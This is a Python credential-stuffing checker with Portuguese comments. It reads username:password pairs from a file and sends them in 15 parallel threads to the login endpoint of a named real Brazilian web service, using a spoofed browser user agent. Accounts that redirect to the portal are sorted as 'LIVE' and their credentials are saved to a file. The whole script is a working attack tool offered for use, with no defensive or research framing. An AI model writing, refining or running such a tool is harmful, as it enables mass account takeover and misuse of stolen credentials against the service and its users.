import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed  # Corrigido aqui
from colorama import init, Fore, Style
import os

init(autoreset=True)

# Configurações (mantidas conforme seu padrão)
MAX_THREADS = 15
TIMEOUT = 30
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
ERROR_FILE = "errors.txt"
LOGINS_FILE = "logins.txt"

stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def show_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "        BY CALUSH N V P")
    print(Fore.CYAN + "══════════════════════════════════")
    print(f"{Fore.GREEN}✅ LIVE: {stats['live']}")
    print(f"{Fore.RED}❌ DIE: {stats['die']}")
    print(f"{Fore.YELLOW}⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + "══════════════════════════════════")
    print(f"{Fore.WHITE}TOTAL: {stats['total']}")
    print(f"TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def save_result(filename, content):
    with open(filename, 'a') as f:
        f.write(content + '\n')

def check_account(username, password):
    try:
        url = "https://sistema.consultcenter.com.br/users/login"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://sistema.consultcenter.com.br'
        }
        data = {
            '_method': 'POST',
            'data[UsuarioLogin][username]': username,
            'data[UsuarioLogin][password]': password
        }

        with requests.Session() as s:
            r = s.post(url, headers=headers, data=data, timeout=TIMEOUT, allow_redirects=False)
            
            # Critério de validação corrigido
            if r.status_code == 302 and 'portal' in r.headers.get('Location', ''):
                return "LIVE", username, password
            return "DIE", username, password

    except Exception as e:
        return "ERROR", username, password, str(e)

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + "Arquivo logins.txt não encontrado!")
        return

    with open(LOGINS_FILE, 'r') as f:
        accounts = [line.strip().split(':') for line in f if ':' in line.strip()]

    stats['total'] = len(accounts)
    show_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(check_account, acc[0], acc[1]) for acc in accounts if len(acc) == 2]
        
        for future in as_completed(futures):  # Agora funcionará
            status, user, pwd, *error = future.result()
            
            if status == "LIVE":
                stats['live'] += 1
                save_result(LIVE_FILE, f"{user}|{pwd}")
                print(f"{Fore.GREEN}[+] LIVE | {user}|{pwd}")
            elif status == "DIE":
                stats['die'] += 1
                save_result(DIE_FILE, f"{user}|{pwd}")
                print(f"{Fore.RED}[-] DIE | {user}|{pwd}")
            else:
                stats['error'] += 1
                save_result(ERROR_FILE, f"{user}|{pwd}|{error[0]}")
                print(f"{Fore.YELLOW}[!] ERROR | {user}|{pwd}")
            
            show_panel()

    print(Fore.GREEN + "\nVerificação concluída!")

if __name__ == "__main__":
    main()